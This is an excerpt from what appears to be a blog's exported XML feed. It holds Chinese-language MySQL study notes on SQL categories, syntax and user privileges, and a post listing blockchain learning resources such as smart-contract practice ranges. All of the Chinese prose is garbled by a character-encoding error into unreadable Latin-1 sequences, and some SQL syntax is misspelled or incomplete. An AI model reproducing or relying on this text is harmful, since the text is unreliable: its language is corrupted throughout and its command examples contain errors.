title="åŸºæœ¬å«ä¹‰ï¼š"></a>åŸºæœ¬å«ä¹‰ï¼š</h3><p>æ•°æ®æ¨¡å‹ç»„æˆçš„ä¸‰è¦ç´ ï¼šæ•°æ®ç»“æ„ï¼Œæ•°æ®æ“ä½œï¼Œæ•°æ®çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶<br>æ•°æ®åº“(DB)ï¼šå‚¨å­˜æ•°æ®çš„ä»“åº“<br>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰<br>æ•°æ®åº“ç³»ç»Ÿï¼ˆDBSï¼‰ï¼šåŒ…å«äº†æ•°æ®åº“å’Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿ<br>å‹ï¼šå¯¹æŸä¸€ç±»æ•°æ®çš„ç»“æ„å’Œå±æ€§çš„è¯´æ˜ï¼Œå€¼ï¼šå¯¹å‹çš„ä¸€ä¸ªå…·ä½“èµ‹å€¼<br>ç¬›å¡å°”ç§¯ï¼šåŸŸçš„ç›¸ä¹˜ï¼Œå°±æ˜¯åŸŸä¹‹é—´çš„æ’åˆ—ç»„åˆ<br>åŸºæ•°ï¼šä¸€ä¸ªåŸŸå…è®¸çš„ä¸åŒå–å€¼çš„ä¸ªæ•°ã€‚å¦‚åŸŸd1,çš„åŸºæ•°ä¸º2ï¼ŒåŸŸd2çš„åŸºæ•°ä¸º3ï¼Œåˆ™æ€»åŸºæ•°ä¸º2*3&#x3D;6ï¼›<br>MySQL: æ“çºµä½•ç®¡ç†æ•°æ®åº“çš„è½¯ä»¶ï¼Œä¸‹è½½å®‰è£…åï¼Œåœ¨ç»ˆç«¯æ‰“å¼€ï¼Œç”¨ï¼šnet start mysql80,åœæ­¢ç”¨ï¼šnet stop mysql80<br>MySQLæ•°æ®åº“æ¨¡å‹ï¼š<br>1ï¼Œå…³ç³»å‹æ•°æ®åº“ï¼ˆRDBMSï¼‰ï¼šå»ºç«‹åœ¨å…³ç³»å‹æ¨¡å‹åŸºç¡€ä¸Šï¼Œç”±å¤šå¼ ç›¸äº’è¿æ¥çš„äºŒç»´è¡¨ç»„æˆçš„æ•°æ®åº“<br> <a href="http://www.mysql.com/">ä¸‹è½½å®‰è£…MySQL</a><br> 1,ç™»å½•æ•°æ®åº“å‘½ä»¤ï¼šcd  C:\Program Files\MySQL\MySQL Server 8.0\binï¼ˆç”±äºæˆ‘é…ç½®äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€è¿™æ­¥å¯ä»¥çœç•¥ï¼‰<br> 2, å®¢æˆ·ç«¯è¿æ¥ï¼Œè¾“å…¥mysql -h localhost -u root -p,è¿›å…¥æ•°æ®åº“,ä¹Ÿå¯ä»¥ç›´æ¥åœ¨å¼€å§‹ç›´æ¥æ‰“å¼€MySQLçš„å‘½ä»¤æç¤ºæ¿è¾“å…¥å¯†ç å³å¯<br> 3,è¾“å…¥show databases; æŸ¥çœ‹å½“å‰æ•°æ®åº“åˆ—è¡¨<br> 4,é€€å‡ºæ‰§è¡Œå‘½ä»¤ï¼šexitæˆ–è€…quit</p><blockquote><p>ä¸€äº›ä¸“ä¸šçš„åè¯è§£é‡Šï¼š1ï¼Œç´¢å¼•ï¼šåŠ å¿«æŸ¥è¯¢é€Ÿåº¦çš„æœ‰æ•ˆæ–¹å¼ï¼Œç”¨æˆ·å¯ä»¥åœ¨åŸºæœ¬è¡¨ä¸Šå»ºç«‹ä¸€ä¸ªæˆ–è€…å¤šä¸ªç´¢å¼•ï¼Œä»¥æä¾›å­˜å–è·¯å¾„ï¼Œç´¢å¼•æ˜¯å±äºå†…æ¨¡å¼çš„èŒƒç•´ã€‚å”¯ä¸€çš„ç´¢å¼•ï¼šä½¿ç”¨UNIQUEå…³é”®å­—ï¼Œæ¯ä¸ªç´¢å¼•å€¼å¯¹åº”å”¯ä¸€ä¸€æ¡æ•°æ®è®°å½• 2ï¼Œè§†å›¾ï¼šè§†å›¾æ˜¯ä»ä¸€ä¸ªæˆ–è€…å‡ ä¸ªåŸºæœ¬è¡¨å¯¼å‡ºçš„è¡¨ï¼Œæ•°æ®åº“åªå­˜åœ¨è§†å›¾çš„å®šä¹‰è€Œä¸æ˜¯å­˜æ”¾è§†å›¾å¯¹åº”çš„æ•°æ®ï¼ŒåŸºæœ¬è¡¨ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œä»è§†å›¾æŸ¥è¯¢å‡ºçš„æ•°æ®ä¹Ÿä¼šéšä¹‹å˜åŒ–ã€‚</p></blockquote><h3 id="SQLï¼š"><a href="#SQLï¼š" class="headerlink" title="SQLï¼š"></a>SQLï¼š</h3><p>SQLï¼šæ˜¯ç”¨äºç®¡ç†æ•°æ®åº“çš„æ ‡å‡†åŒ–ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒç”¨äºæŸ¥è¯¢ï¼Œæ›´æ–°ï¼Œæ’å…¥å’Œåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæ“ä½œæ•°æ®åº“çš„è¯­è¨€ï¼Œä¸ç®¡ä»€ä¹ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰ï¼ŒSQLéƒ½å®ç”¨<br>ä»¥ä¸‹æ‰€å†™éƒ½æ˜¯ç”¨çš„å…³ç³»æ¨¡å‹ï¼›</p><h4 id="ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š"><a href="#ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š" class="headerlink" title="ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š"></a>ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š</h4><p>aï¼Œå¯å•è¡Œæˆ–å¤šè¡Œä¹¦å†™ï¼Œä¸€åˆ†å·ç»“å°¾<br>b,å¯ä»¥ä½¿ç”¨ç©ºæ ¼æˆ–è€…ç¼©è¿›æ¥å¢å¼ºè¯­å¥çš„å¯è¯»æ€§<br>c,MySQLæ•°æ®åº“çš„SQLè¯­å¥éƒ¨åŒºåˆ†å¤§å°å†™ï¼Œå…³é”®å­—å»ºè®®å¤§å†™<br>d,æ³¨é‡Šï¼š</p><ul><li>å•è¡Œæ³¨é‡Šï¼šâ€“ æ³¨é‡Šå†…å®¹æˆ– #æ³¨é‡Šå†…å®¹ï¼ˆMySQLç‰¹æœ‰ï¼‰</li><li>å¤šè¡Œæ³¨é‡Šï¼š&#x2F;* æ³¨é‡Šå†…å®¹*&#x2F;</li></ul><h4 id="äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š"><a href="#äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š" class="headerlink" title="äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š"></a>äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1ï¼ŒDDLï¼šæ•°æ®å®šä¹‰è¯­è¨€ï¼Œç”¨æ¥å®šä¹‰æ•°æ®åº“å¯¹è±¡ï¼ˆæ•°æ®åº“ï¼Œè¡¨ï¼Œå­—æ®µï¼‰</p><p>a,DDL-æ•°æ®åº“æ“ä½œï¼š</p><ul><li>æŸ¥è¯¢ï¼š<ul><li>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼šSHOW DATABASESï¼›</li><li>æŸ¥è¯¢å½“å‰æ•°æ®åº“ï¼šSELECT DATABASE();</li></ul></li><li>åˆ›å»ºï¼š<ul><li>CREATE DATABASE[IF NOT EXISTS]æ•°æ®åº“å[DEFAULT CHARSET å­—ç¬¦é›†] [COLLATE æ’åºè§„åˆ™]ï¼›<blockquote><p>æ‹¬å·ä»£è¡¨å¯ä»¥æœ‰çš„ï¼Œeg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºCREATE DATABASE itcast;</p></blockquote></li></ul></li><li>åˆ é™¤ï¼š<ul><li>DROP DATABASE[IF EXISTS]æ•°æ®åº“åï¼›</li></ul></li><li>ä½¿ç”¨ï¼š<ul><li>USE æ•°æ®åº“åï¼›é¡¾åæ€ä¹‰åˆ‡æ¢åˆ°ä¸€ä¸ªæ•°æ®åº“ä¸­</li></ul></li></ul><p>b,DDL-è¡¨æ“ä½œ</p><ul><li>æŸ¥è¯¢<ul><li>æŸ¥è¯¢å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨ï¼šSHOW TABLES;</li><li>æŸ¥è¯¢è¡¨çš„ç»“æ„ï¼šDESC è¡¨åï¼›</li><li>æŸ¥è¯¢æŒ‡å®šè¡¨çš„å»ºè¡¨è¯­å¥ SHOW CREATE TABLE è¡¨åï¼›</li></ul></li><li>åˆ›å»º<ul><li>CREATE TABLE è¡¨åï¼ˆ<br> å­—æ®µ1 å­—æ®µç±»å‹ COMMENT å­—æ®µ1æ³¨é‡Šï¼Œ<br> å­—æ®µ1 å­—æ®µç±»å‹ COMMENT å­—æ®µ1æ³¨é‡Šï¼Œ<br> å­—æ®µn å­—æ®µç±»å‹ COMMENT å­—æ®µnæ³¨é‡Š<br>ï¼‰[COMMENT è¡¨æ³¨é‡Š] ï¼›<br>ï¼ˆæ³¨æ„ï¼šæœ€åä¸€ä¸ªå­—æ®µæ²¡æœ‰é€—å·ï¼Œå­—æ®µçš„æ³¨é‡Šå¿…é¡»ç”¨â€™â€™å›´ä½,å¯ä»¥å…ˆåœ¨è®°äº‹æœ¬ä¸Šå†™ï¼Œç„¶åç›´æ¥å¤åˆ¶ï¼‰<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT â€˜ç¼–å·â€™<br>-&gt; ) COMMENT â€˜ç”¨æˆ·è¡¨â€™;</li></ul></li></ul><p>c,DDL-è¡¨æ“ä½œ-æ•°æ®ç±»å‹</p><ul><li>æ•°å€¼ç±»å‹ï¼ˆå‚ç…§Javaï¼‰<ul><li>TINYINT(1byte)ï¼ŒSMALLINT(2bytes),MEDIUMINT(3bytes)ï¼ŒINT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>æœ‰ç¬¦å·ï¼ˆSIGNEDï¼‰ï¼ŒèŒƒå›´æœ‰è´Ÿæ•°ï¼Œæ— ç¬¦å·ï¼ˆUNSIGNEDï¼‰ï¼ŒèŒƒå›´æ— è´Ÿæ•°ï¼Œeg:TINYINT æœ‰ç¬¦å·ï¼š-128<del>127ï¼Œæ— ç¬¦å·ï¼š0</del>255ï¼›</li><li>ä¸¾ä¾‹ï¼šå¹´é¾„ï¼šage TINYINT UNSIGNEDï¼›åˆ†æ•°ï¼šscore DOUBLE(4,1)ï¼Œ4ä¸ºæ ‡åº¦ï¼Œæ€»å…±çš„æ•°å­—ä¸ªæ•°ï¼Œ1ä¸ºç²¾åº¦ï¼Œå°æ•°çš„ä½æ•°</li></ul></li><li>å­—ç¬¦ä¸²ç±»å‹<ul><li>CHAR ï¼šå®šé•¿å­—ç¬¦ä¸²ï¼›VARCHARï¼šå˜é•¿å­—ç¬¦ä¸²ï¼›TEST:é•¿æ–‡æœ¬æ•°æ®ï¼›</li><li>CHAR(10),æ€§èƒ½å¥½ï¼›VARCHAR(10)</li></ul></li><li>æ—¥æœŸæ—¶é—´ç±»å‹<ul><li>DATE:èŒƒå›´ï¼š1000-01-01è‡³9999-12-31ï¼Œæ ¼å¼ï¼šYYYY-MM-DD  æ—¥æœŸå€¼  eg:brithday DATE</li><li>TIME:èŒƒå›´ï¼š-838ï¼š59ï¼š59è‡³838ï¼š59ï¼š59ï¼Œæ ¼å¼ï¼šHH:MM:SS  æ—¶é—´å€¼</li><li>YEAR:èŒƒå›´ï¼š1901è‡³2155   æ ¼å¼ï¼šYYYY å¹´ä»½å€¼</li><li>DATETIME:æ··åˆæ—¥æœŸå’Œæ—¶é—´ æ ¼å¼ï¼šYYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :æ··åˆæ—¥æœŸå’Œæ—¶é—´ï¼Œæ—¶é—´æˆ³ æ ¼å¼ï¼šYYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-è¡¨æ“ä½œ-ä¿®æ”¹</p><ul><li>æ·»åŠ å­—æ®µï¼šALTER TABLE è¡¨å ADD å­—æ®µå ç±»å‹ï¼ˆé•¿åº¦ï¼‰[COMMENT æ³¨é‡Š] [çº¦æŸ ]ï¼›</li><li>ä¿®æ”¹å­—æ®µ<ul><li>ä¿®æ”¹æ•°æ®ç±»å‹ ï¼š ALTER TBALE è¡¨å å­—æ®µå æ–°æ•°æ®ç±»å‹ï¼ˆé•¿åº¦ï¼‰ï¼›</li><li>ä¿®æ”¹å­—æ®µåï¼Œå­—æ®µç±»å‹ ï¼šALTER TABLE è¡¨å CHANGE æ—§å­—æ®µå æ–°å­—æ®µå ç±»å‹ï¼ˆé•¿åº¦ï¼‰[COMMENT æ³¨é‡Š] [çº¦æŸ ]ï¼›</li></ul></li><li>åˆ é™¤å­—æ®µ : ALTER TABLE è¡¨å DROP å­—æ®µåï¼›</li><li>ä¿®æ”¹è¡¨å ï¼šALTER TABLE è¡¨å RENAME TO æ–°è¡¨åï¼›</li><li>åˆ é™¤ï¼š<ul><li>åˆ é™¤è¡¨ ï¼šDROP TABLE [IF EXISTS]è¡¨åï¼›</li><li>åˆ é™¤æŒ‡å®šè¡¨ï¼Œå¹¶é‡æ–°åˆ›å»ºè¯¥è¡¨ : TRUNCATE TABLE è¡¨åï¼›ï¼ˆä¸€èˆ¬ä¸ä½¿ç”¨å®ƒï¼Œå› ä¸ºå®ƒä¼šé‡æ–°åˆ›å»ºè¯¥è¡¨ï¼Œåªæ˜¯æ²¡æœ‰ç»“æ„ï¼‰<br>MySQL å›¾å½¢åŒ–ç•Œé¢ï¼šDataGrip,ä½¿ç”¨å®ƒå°±å¯ä»¥ç›´æ¥å†™äº†</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2ï¼ŒDMLï¼šæ•°æ®æ“ä½œè¯­è¨€ï¼Œç”¨æ¥å¯¹æ•°æ®åº“è¡¨ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹  æ¶‰åŠçš„å…³é”®å­—ï¼šINSERT INTO<br>a,DML-æ·»åŠ æ•°æ®ï¼š</p><ul><li>ç»™æŒ‡å®šå­—æ®µæ·»åŠ æ•°æ®ï¼šINSERT INTO è¡¨åï¼ˆå­—æ®µå1ï¼Œå­—æ®µå2â€¦ ï¼‰VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›</li><li>ç»™å…¨éƒ¨å­—æ®µæ·»åŠ æ•°ï¼šINSERT INTO è¡¨å VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›å€¼1ï¼Œå°±æ˜¯è¡¨ä¸­ç¬¬ä¸€åˆ—</li><li>æ‰¹é‡æ·»åŠ æ•°æ®ï¼š<ul><li>INSERT INTO è¡¨åï¼ˆå­—æ®µå1ï¼Œå­—æ®µå2â€¦ ï¼‰VALUESï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›</li><li>INSERT INTO è¡¨å VALUE(å€¼1ï¼Œå€¼2)ï¼Œï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼ˆå€¼1ï¼Œå€¼2â€¦ï¼‰ï¼›<br>bï¼ŒDML-ä¿®æ”¹æ•°æ®</li></ul></li><li>UPDATE è¡¨å SET å­—æ®µå1 &#x3D; å€¼1ï¼Œå­—æ®µå2 &#x3D; å€¼2ï¼Œâ€¦[WHERE æ¡ä»¶]ï¼›<br>c,DML-åˆ é™¤æ•°æ®</li><li>DELETE FROM è¡¨å [WHERE æ¡ä»¶]ï¼›</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3ï¼ŒDQLï¼šæ•°æ®æŸ¥è¯¢è¯­è¨€ï¼Œç”¨æ¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨çš„è®°å½•   æ¶‰åŠçš„å…³é”®å­—ï¼šSELECT</p><p>a,DQL-è¯­æ³•ï¼ˆä¹Ÿæ˜¯ç¼–å†™é¡ºåºï¼‰ï¼š<br>SELECT<br>       å­—æ®µåˆ—è¡¨<br>FROM<br>       è¡¨ååˆ—è¡¨<br>WHERE<br>       æ¡ä»¶åˆ—è¡¨<br>GROUP BY<br>       åˆ†ç»„å­—æ®µåˆ—è¡¨<br>HAVING<br>       åˆ†ç»„åæ¡ä»¶åˆ—è¡¨<br>ORDER BY<br>       æ’åºå­—æ®µåˆ—è¡¨<br>LIMIT<br>       åˆ†é¡µå‚æ•°</p><p>b,DQL-åŸºæœ¬æŸ¥è¯¢</p><ul><li>æŸ¥è¯¢å¤šä¸ªå­—æ®µ<ul><li>SELECT å­—æ®µ1ï¼Œå­—æ®µ2ï¼Œå­—æ®µ3â€¦. FROM è¡¨åï¼›</li><li>SELECT *FROM è¡¨åï¼›æŸ¥è¯¢æ‰€æœ‰å­—æ®µ</li></ul></li><li>è®¾ç½®åˆ«åï¼šSELECT å­—æ®µ1[AS åˆ«å1]ï¼Œå­—æ®µ2[AS åˆ«å2]â€¦FROM è¡¨åï¼›</li><li>å»é™¤é‡å¤è®°å½•ï¼šSELECT DISTINCT å­—æ®µåˆ—è¡¨ FROM è¡¨åï¼›<br>c,DQL-æ¡ä»¶æŸ¥è¯¢</li><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å WHERE æ¡ä»¶åˆ—è¡¨ï¼›</li><li>æ¡ä»¶ï¼šwhereåé¢å¯ä»¥è·Ÿæ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ï¼ŒIN(),LIKE å ä½ç¬¦ _ % ï¼‰å’Œé€»è¾‘è¿ç®—ç¬¦ï¼ˆAND ,&amp;&amp;,OR,||,NOT,!ï¼‰</li><li>in(),å°±æ˜¯æ‹¬å·é‡Œçš„æ¡ä»¶ä»»æ„æ»¡è¶³å…¶ä¸€å³å¯ï¼Œbetweenæœ€å°å€¼ and æœ€å¤§å€¼,like æ¨¡ç³ŠåŒ¹é… ä¸‹åˆ’çº¿_å ä¸€ä¸ªå­—ç¬¦ï¼Œç™¾åˆ†å·% håè·Ÿè°æŸ¥è°ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚æŸ¥è¯¢åå­—ä¸ºä¿©ä¸ªå­—çš„å‘˜å·¥ï¼šlike â€˜_ _â€™;  ä¾‹å¦‚æŸ¥èº«ä»½è¯æœ€åä¸€ä¸ªå­—ç¬¦ä¸ºXï¼šlike â€˜%xâ€™;</li></ul><p>c,DQL-èšåˆå‡½æ•°</p><ul><li>ä»‹ç»ï¼šå°†ä¸€åˆ—æ•°æ®ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¿›è¡Œçºµå‘è®¡ç®—</li><li>å¸¸è§çš„èšåˆå‡½æ•°<ul><li>count ï¼šç»Ÿè®¡æ•°é‡</li><li>max :æœ€å¤§å€¼</li><li>min : æœ€å°å€¼</li><li>avg : å¹³å‡å€¼</li><li>sum : æ±‚å’Œ</li></ul></li><li>è¯­æ³•<ul><li>SELECT èšåˆå‡½æ•°ï¼ˆå­—æ®µåˆ—è¡¨ï¼‰FROM è¡¨åï¼›</li></ul></li></ul><p>d,DQL-åˆ†ç»„æŸ¥è¯¢</p><ul><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å[WHERE æ¡ä»¶] GROUP BY åˆ†ç»„å­—æ®µå [HAVING åˆ†ç»„åè¿‡æ»¤æ¡ä»¶]ï¼›</li><li>whereä¸havingåŒºåˆ«ï¼š<ul><li>æ‰§è¡Œæ—¶æœºä¸åŒï¼šwhereæ˜¯åˆ†ç»„å‰è¿›è¡Œè¿‡æ»¤ï¼Œä¸æ»¡è¶³whereæ¡ä»¶ï¼Œä¸å‚ä¸åˆ†ç»„ï¼›è€Œhavingæ˜¯åˆ†ç»„åå¯¹ç»“æœè¿›è¡Œè¿‡æ»¤</li><li>åˆ¤æ–­æ¡ä»¶ä¸åŒï¼šwhereä¸èƒ½å¯¹èšåˆå‡½æ•°è¿›è¡Œåˆ¤æ–­ï¼Œè€Œhavingå¯ä»¥ï¼›</li><li>æ³¨æ„äº‹é¡¹ï¼šæ‰§è¡Œé¡ºåºï¼šwhere&gt;èšåˆå‡½æ•°&gt;having; åˆ†ç»„åï¼ŒæŸ¥è¯¢çš„å­—æ®µä¸€èˆ¬ä¸ºèšåˆå‡½æ•°å’Œåˆ†ç»„å­—æ®µï¼ŒæŸ¥è¯¢å…¶ä»–å­—æ®µæ— ä»»ä½•æ„ä¹‰</li></ul></li></ul><p>e,DQL-æ’åºæŸ¥è¯¢</p><ul><li>è¯­æ³•: SELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å ORDER BY å­—æ®µ1 æ’åºæ–¹å¼1ï¼Œå­—æ®µ2ï¼Œæ’åºæ–¹å¼äºŒï¼›</li><li>æ’åºæ–¹å¼ï¼š<ul><li>ASC: å‡åºï¼ˆé»˜è®¤å€¼ï¼‰</li><li>DESC: é™åº</li></ul></li></ul><p>f,DQL-åˆ†é¡µæŸ¥è¯¢</p><ul><li>è¯­æ³•ï¼šSELECT å­—æ®µåˆ—è¡¨ FROM è¡¨å LIMIT èµ·å§‹ç´¢å¼•ï¼ŒæŸ¥è¯¢è®°å½•æ•°ï¼›</li><li>æ³¨æ„ï¼š<ul><li>èµ·å§‹ç´¢å¼•ä»é›¶å¼€å§‹ï¼Œèµ·å§‹ç´¢å¼• &#x3D; ï¼ˆæŸ¥è¯¢é¡µç -1ï¼‰*æ¯é¡µæ˜¾ç¤ºè®°å½•æ•°</li><li>åˆ†é¡µæŸ¥è¯¢æ˜¯æ•°æ®åº“çš„æ–¹è¨€ï¼Œä¸åŒçš„æ•°æ®åº“æœ‰ä¸åŒçš„å®ç°ï¼ŒMySQLä¸­å¼LIMIT</li><li>å¦‚æœæŸ¥è¯¢çš„æ˜¯ç¬¬ä¸€é¡µæ•°æ®ï¼Œèµ·å§‹ç´¢å¼•å¯ä»¥çœç•¥ï¼Œç›´æ¥å†™limit 10</li></ul></li></ul><p>h,DQL-æ‰§è¡Œé¡ºåº<br> FROM<br>    è¡¨ååˆ—è¡¨<br>WHERE<br>    æ¡ä»¶åˆ—è¡¨<br>GROUP BY<br>     åˆ†ç»„å­—æ®µåˆ—è¡¨<br>HAVING<br>     åˆ†ç»„åæ¡ä»¶åˆ—è¡¨<br>SELECT<br>     å­—æ®µåˆ—è¡¨<br>ORDER BY<br>     æ’åºå­—æ®µåˆ—è¡¨<br>LIMIT<br>     åˆ†é¡µå‚æ•°</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4ï¼ŒDCLï¼šæ•°æ®æ§åˆ¶è¯­è¨€ï¼Œç”¨æ¥åˆ›å»ºæ•°æ®åº“ç”¨æˆ·ï¼Œæ§åˆ¶æ•°æ®åº“çš„è®¿é—®æƒé™,å°±æ˜¯æ§åˆ¶æœ‰é‚£äº›ç”¨æˆ·å¯ä»¥è®¿é—®æ•°æ®åº“</p><p>a,DCL-ç”¨æˆ·ç®¡ç†</p><ul><li>æŸ¥è¯¢ç”¨æˆ·ï¼šUSE mysql; SELECT *FROM user;</li><li>åˆ›å»ºç”¨æˆ·ï¼šCREATE USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ IDENTIFIED BY â€˜å¯†ç â€™ï¼›</li><li>ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼šALTER USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ IDENTIFIED WITH mysql_native_password BY â€˜æ–°å¯†ç â€™ï¼›</li><li>åˆ é™¤ç”¨æˆ·ï¼šDROP USER â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li><li>ä¸»æœºåï¼šlocalhost ä»£è¡¨åªèƒ½åœ¨å½“å‰ä¸»æœºè®¿é—®æ•°æ®åº“ï¼Œ% ä»£è¡¨å¯ä»¥åœ¨ä»»æ„ä¸»æœºä¸Šè®¿é—®æ•°æ®åº“ï¼›</li></ul><p>b,DCL-æ§åˆ¶æƒé™</p><ul><li>ALL ,ALL PRIVILEGES : æ‰€æœ‰æƒé™</li><li>SELECT : æŸ¥è¯¢æ•°æ®</li><li>INSERT ï¼šæ’å…¥æ•°æ®</li><li>UPDATE : ä¿®æ”¹æ•°æ®</li><li>DELETE : åˆ é™¤æ•°æ®</li><li>ALTER : ä¿®æ”¹è¡¨</li><li>DROP : åˆ é™¤æ•°æ®åº“ï¼Œè¡¨ï¼Œè§†å›¾</li><li>CREATE : åˆ›å»ºæ•°æ®åº“ï¼Œè¡¨</li><li>ä¸»è¦ä½¿ç”¨ï¼š<ul><li>æŸ¥è¯¢æƒé™ï¼šSHOW GRANTS FOR â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li><li>æˆäºˆæƒé™ï¼šGRANT æˆæƒåˆ—è¡¨ ON æ•°æ®åº“å.è¡¨å TO â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™;</li><li>æ’¤é”€æƒé™ï¼šREVOKE æƒé™åˆ—è¡¨ ON æ•°æ®åº“å.è¡¨å FROM â€˜ç”¨æˆ·åâ€˜@â€™ä¸»æœºåâ€™ï¼›</li></ul></li></ul><hr><p>ï¼ˆç”±äºåé¢è¦å­¦ä¹ solidityï¼Œæ‰€ä»¥å°±æ²¡æœ‰å†æ›´æ–°æ•°æ®åº“åŸç†äº†ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å…¥é—¨çŸ¥è¯†å¸¸ç”¨é“¾æ¥</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>æ¨èè¿™ä¸ªåšä¸»çš„æ•´ä¸ªå…¥é—¨åŒºå—é“¾çš„æ–¹å‘ï¼Œé‡Œé¢æœ‰ä¸ªæ€ç»´å¯¼å›¾ï¼Œå€¼å¾—ä¸€çœ‹.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">ç‚¹å‡»</a></li><li>åƒµå°¸ç¼–ç¨‹å­¦ä¹ <a href="https://cryptozombies.io/">ç‚¹å‡»</a></li><li>WTFå­¦é™¢ï¼Œå­¦ä¹  EVM ï¼Œsolidityå€¼å¾—ä¸€çœ‹.<a href="https://www.wtf.academy/">ç‚¹å‡»</a></li><li>Ethernauté¶åœºç»ƒä¹ ï¼Œ<a href="https://ethernaut.openzeppelin.com/">ç‚¹å‡»</a></li><li>damn-vulnerable-defié¶åœºç»ƒä¹ ï¼Œ<a href="https://www.damnvulnerabledefi.xyz/">ç‚¹å‡»</a></li><li>EVM PUZZLESé¢˜è§£å‚è€ƒé“¾æ¥ï¼Œ<a href="https://learnblockchain.cn/article/5533">ç‚¹å‡»1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">ç‚¹å‡»äºŒ</a></li><li>evm codeæŒ‡ä»¤é€ŸæŸ¥ <a href="https://www.evm.codes/?fork=shanghai">ç‚¹å‡»</a></li><li>æ³¨:è‡ªæ¯å‡½æ•°å°†ä¼šè¢«å¼ƒç”¨,<a href="https://eips.ethereum.org/EIPS/eip-4758">ç‚¹å‡»1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">ç‚¹å‡»2</a></li><li><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">é—ªç”µè´·çš„æç®€å…¥é—¨</a></li><li>å…³äºsolidityçš„ä¸€äº›åŸºæœ¬é—®é¢˜,ç”¨äºè‡ªæŸ¥ï¼Œ<a href="https://www.rareskills.io/post/solidity-interview-questions">ç‚¹å‡»</a></li><li>å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°githubä¸Šï¼Œ<blockquote><p>è¦æœ‰ä¸€ä¸ªè‡ªå·±æƒ³ä¸Šä¼ çš„ä»“åº“ï¼Œ<br>cd è¦ä¸Šä¼ çš„æ–‡ä»¶åï¼Œgit remote add origin (sshä¸‹çš„ä»“åº“åœ°å€)ï¼Œ<br>åˆ‡æ¢åˆ†æ”¯ï¼Œä¸»è¦æ˜¯çœ‹ä»“åº“æ˜¯master,è¿˜æ˜¯main, è¿˜æ˜¯å…¶ä»–çš„åˆ†æ”¯ï¼Œgit branch -M main , åˆ‡æ¢åˆ°mainåˆ†æ”¯ä¸Š<br>ç›´æ¥ä¸Šä¼ åˆ°åˆ†æ”¯ä¸Š git push -u origin main<br>å³å¯</p></blockquote></li></ul><p>ä¸€äº›æ™ºèƒ½çš„å·¥å…·ï¼š<br><a 